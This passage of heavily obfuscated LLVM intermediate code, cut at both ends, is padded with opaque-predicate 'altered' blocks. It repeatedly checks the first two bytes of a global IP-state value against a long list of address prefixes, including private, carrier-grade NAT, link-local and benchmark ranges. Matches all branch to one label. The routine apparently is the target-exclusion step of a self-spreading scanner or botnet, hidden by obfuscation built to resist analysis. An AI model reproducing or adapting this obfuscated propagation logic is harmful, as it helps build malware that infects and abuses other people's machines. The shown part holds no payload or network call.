  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %409, label %5234, label %418

; <label>:418:                                    ; preds = %originalBBpart251, %394
  %419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 152
  br i1 %421, label %422, label %426

; <label>:422:                                    ; preds = %418
  %423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %424 = zext i8 %423 to i32
  %425 = icmp eq i32 %424, 82
  br i1 %425, label %5234, label %426

; <label>:426:                                    ; preds = %422, %418
  %427 = load i32, i32* @x.71
  %428 = load i32, i32* @y.72
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %426
  %435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %436 = zext i8 %435 to i32
  %437 = icmp eq i32 %436, 152
  %438 = load i32, i32* @x.71
  %439 = load i32, i32* @y.72
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %437, label %446, label %466

; <label>:446:                                    ; preds = %originalBBpart255
  %447 = load i32, i32* @x.71
  %448 = load i32, i32* @y.72
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %446
  %455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %456 = zext i8 %455 to i32
  %457 = icmp eq i32 %456, 229
  %458 = load i32, i32* @x.71
  %459 = load i32, i32* @y.72
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %457, label %5234, label %466

; <label>:466:                                    ; preds = %originalBBpart259, %originalBBpart255
  %467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %468 = zext i8 %467 to i32
  %469 = icmp eq i32 %468, 157
  br i1 %469, label %470, label %474

; <label>:470:                                    ; preds = %466
  %471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %472 = zext i8 %471 to i32
  %473 = icmp eq i32 %472, 202
  br i1 %473, label %5234, label %474

; <label>:474:                                    ; preds = %470, %466
  %475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %476 = zext i8 %475 to i32
  %477 = icmp eq i32 %476, 157
  br i1 %477, label %478, label %482

; <label>:478:                                    ; preds = %474
  %479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %480 = zext i8 %479 to i32
  %481 = icmp eq i32 %480, 217
  br i1 %481, label %5234, label %482

; <label>:482:                                    ; preds = %478, %474
  %483 = load i32, i32* @x.71
  %484 = load i32, i32* @y.72
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %482
  %491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %492 = zext i8 %491 to i32
  %493 = icmp eq i32 %492, 161
  %494 = load i32, i32* @x.71
  %495 = load i32, i32* @y.72
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %493, label %502, label %506

; <label>:502:                                    ; preds = %originalBBpart263
  %503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %504 = zext i8 %503 to i32
  %505 = icmp eq i32 %504, 124
  br i1 %505, label %5234, label %506

; <label>:506:                                    ; preds = %502, %originalBBpart263
  %507 = load i32, i32* @x.71
  %508 = load i32, i32* @y.72
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %506
  %515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %516 = zext i8 %515 to i32
  %517 = icmp eq i32 %516, 162
  %518 = load i32, i32* @x.71
  %519 = load i32, i32* @y.72
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %517, label %526, label %530

; <label>:526:                                    ; preds = %originalBBpart267
  %527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %528 = zext i8 %527 to i32
  %529 = icmp eq i32 %528, 32
  br i1 %529, label %5234, label %530

; <label>:530:                                    ; preds = %526, %originalBBpart267
  %531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %532 = zext i8 %531 to i32
  %533 = icmp eq i32 %532, 155
  br i1 %533, label %534, label %538

; <label>:534:                                    ; preds = %530
  %535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %536 = zext i8 %535 to i32
  %537 = icmp eq i32 %536, 96
  br i1 %537, label %5234, label %538

; <label>:538:                                    ; preds = %534, %530
  %539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %540 = zext i8 %539 to i32
  %541 = icmp eq i32 %540, 155
  br i1 %541, label %542, label %546

; <label>:542:                                    ; preds = %538
  %543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %544 = zext i8 %543 to i32
  %545 = icmp eq i32 %544, 149
  br i1 %545, label %5234, label %546

; <label>:546:                                    ; preds = %542, %538
  %547 = load i32, i32* @x.71
  %548 = load i32, i32* @y.72
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %546
  %555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %556 = zext i8 %555 to i32
  %557 = icmp eq i32 %556, 155
  %558 = load i32, i32* @x.71
  %559 = load i32, i32* @y.72
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %557, label %566, label %570

; <label>:566:                                    ; preds = %originalBBpart271
  %567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %568 = zext i8 %567 to i32
  %569 = icmp eq i32 %568, 155
  br i1 %569, label %5234, label %570

; <label>:570:                                    ; preds = %566, %originalBBpart271
  %571 = load i32, i32* @x.71
  %572 = load i32, i32* @y.72
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %570
  %579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %580 = zext i8 %579 to i32
  %581 = icmp eq i32 %580, 155
  %582 = load i32, i32* @x.71
  %583 = load i32, i32* @y.72
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %581, label %590, label %594

; <label>:590:                                    ; preds = %originalBBpart275
  %591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %592 = zext i8 %591 to i32
  %593 = icmp eq i32 %592, 178
  br i1 %593, label %5234, label %594

; <label>:594:                                    ; preds = %590, %originalBBpart275
  %595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %596 = zext i8 %595 to i32
  %597 = icmp eq i32 %596, 164
  br i1 %597, label %598, label %618

; <label>:598:                                    ; preds = %594
  %599 = load i32, i32* @x.71
  %600 = load i32, i32* @y.72
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %598
  %607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %608 = zext i8 %607 to i32
  %609 = icmp eq i32 %608, 158
  %610 = load i32, i32* @x.71
  %611 = load i32, i32* @y.72
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %609, label %5234, label %618

; <label>:618:                                    ; preds = %originalBBpart279, %594
  %619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %620 = zext i8 %619 to i32
  %621 = icmp eq i32 %620, 156
  br i1 %621, label %622, label %626

; <label>:622:                                    ; preds = %618
  %623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %624 = zext i8 %623 to i32
  %625 = icmp eq i32 %624, 9
  br i1 %625, label %5234, label %626

; <label>:626:                                    ; preds = %622, %618
  %627 = load i32, i32* @x.71
  %628 = load i32, i32* @y.72
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %626
  %635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %636 = zext i8 %635 to i32
  %637 = icmp eq i32 %636, 167
  %638 = load i32, i32* @x.71
  %639 = load i32, i32* @y.72
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %637, label %646, label %666

; <label>:646:                                    ; preds = %originalBBpart283
  %647 = load i32, i32* @x.71
  %648 = load i32, i32* @y.72
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %646
  %655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %656 = zext i8 %655 to i32
  %657 = icmp eq i32 %656, 44
  %658 = load i32, i32* @x.71
  %659 = load i32, i32* @y.72
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %657, label %5234, label %666

; <label>:666:                                    ; preds = %originalBBpart287, %originalBBpart283
  %667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %668 = zext i8 %667 to i32
  %669 = icmp eq i32 %668, 168
  br i1 %669, label %670, label %674

; <label>:670:                                    ; preds = %666
  %671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %672 = zext i8 %671 to i32
  %673 = icmp eq i32 %672, 68
  br i1 %673, label %5234, label %674

; <label>:674:                                    ; preds = %670, %666
  %675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %676 = zext i8 %675 to i32
  %677 = icmp eq i32 %676, 168
  br i1 %677, label %678, label %682

; <label>:678:                                    ; preds = %674
  %679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %680 = zext i8 %679 to i32
  %681 = icmp eq i32 %680, 85
  br i1 %681, label %5234, label %682

; <label>:682:                                    ; preds = %678, %674
  %683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %684 = zext i8 %683 to i32
  %685 = icmp eq i32 %684, 168
  br i1 %685, label %686, label %690

; <label>:686:                                    ; preds = %682
  %687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %688 = zext i8 %687 to i32
  %689 = icmp eq i32 %688, 102
  br i1 %689, label %5234, label %690

; <label>:690:                                    ; preds = %686, %682
  %691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %692 = zext i8 %691 to i32
  %693 = icmp eq i32 %692, 203
  br i1 %693, label %694, label %698

; <label>:694:                                    ; preds = %690
  %695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %696 = zext i8 %695 to i32
  %697 = icmp eq i32 %696, 59
  br i1 %697, label %5234, label %698

; <label>:698:                                    ; preds = %694, %690
  %699 = load i32, i32* @x.71
  %700 = load i32, i32* @y.72
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %698
  %707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %708 = zext i8 %707 to i32
  %709 = icmp eq i32 %708, 204
  %710 = load i32, i32* @x.71
  %711 = load i32, i32* @y.72
  %712 = sub i32 %710, 1
  %713 = mul i32 %710, %712
  %714 = urem i32 %713, 2
  %715 = icmp eq i32 %714, 0
  %716 = icmp slt i32 %711, 10
  %717 = or i1 %715, %716
  br i1 %717, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br i1 %709, label %718, label %722

; <label>:718:                                    ; preds = %originalBBpart291
  %719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %720 = zext i8 %719 to i32
  %721 = icmp eq i32 %720, 34
  br i1 %721, label %5234, label %722

; <label>:722:                                    ; preds = %718, %originalBBpart291
  %723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %724 = zext i8 %723 to i32
  %725 = icmp eq i32 %724, 207
  br i1 %725, label %726, label %746

; <label>:726:                                    ; preds = %722
  %727 = load i32, i32* @x.71
  %728 = load i32, i32* @y.72
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %726
  %735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 30
  %738 = load i32, i32* @x.71
  %739 = load i32, i32* @y.72
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %737, label %5234, label %746

; <label>:746:                                    ; preds = %originalBBpart295, %722
  %747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %748 = zext i8 %747 to i32
  %749 = icmp eq i32 %748, 117
  br i1 %749, label %750, label %754

; <label>:750:                                    ; preds = %746
  %751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %752 = zext i8 %751 to i32
  %753 = icmp eq i32 %752, 55
  br i1 %753, label %5234, label %754

; <label>:754:                                    ; preds = %750, %746
  %755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %756 = zext i8 %755 to i32
  %757 = icmp eq i32 %756, 117
  br i1 %757, label %758, label %762

; <label>:758:                                    ; preds = %754
  %759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %760 = zext i8 %759 to i32
  %761 = icmp eq i32 %760, 56
  br i1 %761, label %5234, label %762

; <label>:762:                                    ; preds = %758, %754
  %763 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %764 = zext i8 %763 to i32
  %765 = icmp eq i32 %764, 80
  br i1 %765, label %766, label %786

; <label>:766:                                    ; preds = %762
  %767 = load i32, i32* @x.71
  %768 = load i32, i32* @y.72
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %766
  %775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %776 = zext i8 %775 to i32
  %777 = icmp eq i32 %776, 235
  %778 = load i32, i32* @x.71
  %779 = load i32, i32* @y.72
  %780 = sub i32 %778, 1
  %781 = mul i32 %778, %780
  %782 = urem i32 %781, 2
  %783 = icmp eq i32 %782, 0
  %784 = icmp slt i32 %779, 10
  %785 = or i1 %783, %784
  br i1 %785, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %777, label %5234, label %786

; <label>:786:                                    ; preds = %originalBBpart299, %762
  %787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %788 = zext i8 %787 to i32
  %789 = icmp eq i32 %788, 207
  br i1 %789, label %790, label %794

; <label>:790:                                    ; preds = %786
  %791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %792 = zext i8 %791 to i32
  %793 = icmp eq i32 %792, 120
  br i1 %793, label %5234, label %794

; <label>:794:                                    ; preds = %790, %786
  %795 = load i32, i32* @x.71
  %796 = load i32, i32* @y.72
  %797 = sub i32 %795, 1
  %798 = mul i32 %795, %797
  %799 = urem i32 %798, 2
  %800 = icmp eq i32 %799, 0
  %801 = icmp slt i32 %796, 10
  %802 = or i1 %800, %801
  br i1 %802, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %794
  %803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %804 = zext i8 %803 to i32
  %805 = icmp eq i32 %804, 209
  %806 = load i32, i32* @x.71
  %807 = load i32, i32* @y.72
  %808 = sub i32 %806, 1
  %809 = mul i32 %806, %808
  %810 = urem i32 %809, 2
  %811 = icmp eq i32 %810, 0
  %812 = icmp slt i32 %807, 10
  %813 = or i1 %811, %812
  br i1 %813, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %805, label %814, label %818

; <label>:814:                                    ; preds = %originalBBpart2103
  %815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %816 = zext i8 %815 to i32
  %817 = icmp eq i32 %816, 35
  br i1 %817, label %5234, label %818

; <label>:818:                                    ; preds = %814, %originalBBpart2103
  %819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %820 = zext i8 %819 to i32
  %821 = icmp eq i32 %820, 64
  br i1 %821, label %822, label %826

; <label>:822:                                    ; preds = %818
  %823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %824 = zext i8 %823 to i32
  %825 = icmp eq i32 %824, 70
  br i1 %825, label %5234, label %826

; <label>:826:                                    ; preds = %822, %818
  %827 = load i32, i32* @x.71
  %828 = load i32, i32* @y.72
  %829 = sub i32 %827, 1
  %830 = mul i32 %827, %829
  %831 = urem i32 %830, 2
  %832 = icmp eq i32 %831, 0
  %833 = icmp slt i32 %828, 10
  %834 = or i1 %832, %833
  br i1 %834, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %826
  %835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %836 = zext i8 %835 to i32
  %837 = icmp eq i32 %836, 172
  %838 = load i32, i32* @x.71
  %839 = load i32, i32* @y.72
  %840 = sub i32 %838, 1
  %841 = mul i32 %838, %840
  %842 = urem i32 %841, 2
  %843 = icmp eq i32 %842, 0
  %844 = icmp slt i32 %839, 10
  %845 = or i1 %843, %844
  br i1 %845, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br i1 %837, label %846, label %854

; <label>:846:                                    ; preds = %originalBBpart2107
  %847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %848 = zext i8 %847 to i32
  %849 = icmp sge i32 %848, 16
  br i1 %849, label %850, label %854

; <label>:850:                                    ; preds = %846
  %851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %852 = zext i8 %851 to i32
  %853 = icmp slt i32 %852, 32
  br i1 %853, label %5234, label %854

; <label>:854:                                    ; preds = %850, %846, %originalBBpart2107
  %855 = load i32, i32* @x.71
  %856 = load i32, i32* @y.72
  %857 = sub i32 %855, 1
  %858 = mul i32 %855, %857
  %859 = urem i32 %858, 2
  %860 = icmp eq i32 %859, 0
  %861 = icmp slt i32 %856, 10
  %862 = or i1 %860, %861
  br i1 %862, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %854
  %863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %864 = zext i8 %863 to i32
  %865 = icmp eq i32 %864, 100
  %866 = load i32, i32* @x.71
  %867 = load i32, i32* @y.72
  %868 = sub i32 %866, 1
  %869 = mul i32 %866, %868
  %870 = urem i32 %869, 2
  %871 = icmp eq i32 %870, 0
  %872 = icmp slt i32 %867, 10
  %873 = or i1 %871, %872
  br i1 %873, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br i1 %865, label %874, label %898

; <label>:874:                                    ; preds = %originalBBpart2111
  %875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %876 = zext i8 %875 to i32
  %877 = icmp sge i32 %876, 64
  br i1 %877, label %878, label %898

; <label>:878:                                    ; preds = %874
  %879 = load i32, i32* @x.71
  %880 = load i32, i32* @y.72
  %881 = sub i32 %879, 1
  %882 = mul i32 %879, %881
  %883 = urem i32 %882, 2
  %884 = icmp eq i32 %883, 0
  %885 = icmp slt i32 %880, 10
  %886 = or i1 %884, %885
  br i1 %886, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %878
  %887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %888 = zext i8 %887 to i32
  %889 = icmp slt i32 %888, 127
  %890 = load i32, i32* @x.71
  %891 = load i32, i32* @y.72
  %892 = sub i32 %890, 1
  %893 = mul i32 %890, %892
  %894 = urem i32 %893, 2
  %895 = icmp eq i32 %894, 0
  %896 = icmp slt i32 %891, 10
  %897 = or i1 %895, %896
  br i1 %897, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br i1 %889, label %5234, label %898

; <label>:898:                                    ; preds = %originalBBpart2115, %874, %originalBBpart2111
  %899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %900 = zext i8 %899 to i32
  %901 = icmp eq i32 %900, 169
  br i1 %901, label %902, label %906

; <label>:902:                                    ; preds = %898
  %903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %904 = zext i8 %903 to i32
  %905 = icmp eq i32 %904, 254
  br i1 %905, label %5234, label %906

; <label>:906:                                    ; preds = %902, %898
  %907 = load i32, i32* @x.71
  %908 = load i32, i32* @y.72
  %909 = sub i32 %907, 1
  %910 = mul i32 %907, %909
  %911 = urem i32 %910, 2
  %912 = icmp eq i32 %911, 0
  %913 = icmp slt i32 %908, 10
  %914 = or i1 %912, %913
  br i1 %914, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %906
  %915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %916 = zext i8 %915 to i32
  %917 = icmp eq i32 %916, 198
  %918 = load i32, i32* @x.71
  %919 = load i32, i32* @y.72
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br i1 %917, label %926, label %934

; <label>:926:                                    ; preds = %originalBBpart2119
  %927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %928 = zext i8 %927 to i32
  %929 = icmp sge i32 %928, 18
  br i1 %929, label %930, label %934

; <label>:930:                                    ; preds = %926
  %931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %932 = zext i8 %931 to i32
  %933 = icmp slt i32 %932, 20
  br i1 %933, label %5234, label %934

; <label>:934:                                    ; preds = %930, %926, %originalBBpart2119
  %935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %936 = zext i8 %935 to i32
  %937 = icmp eq i32 %936, 64
